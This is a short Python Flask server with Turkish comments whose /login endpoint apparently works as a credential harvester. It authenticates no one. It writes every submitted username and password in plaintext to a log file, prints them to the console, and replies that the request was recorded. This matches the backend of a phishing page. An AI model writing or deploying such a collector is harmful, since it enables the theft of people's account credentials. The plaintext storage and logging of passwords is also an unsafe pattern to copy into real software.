from datetime import datetime
from flask import Flask, request

app = Flask(__name__)

# Ana sayfaya ( / ) girildiğinde hata vermemesi için:
@app.route('/')
def home():
    return "Sunucu aktif! Giriş endpoint'i /login adresindedir."

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("login_logs.txt", "a", encoding="utf-8") as f:
        f.write(f"{username}|{password}|{zaman}\n")
        
    print(f"[LOG] {zaman} - Kullanıcı: {username} | Şifre: {password}")
    return "İstek kaydedildi"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

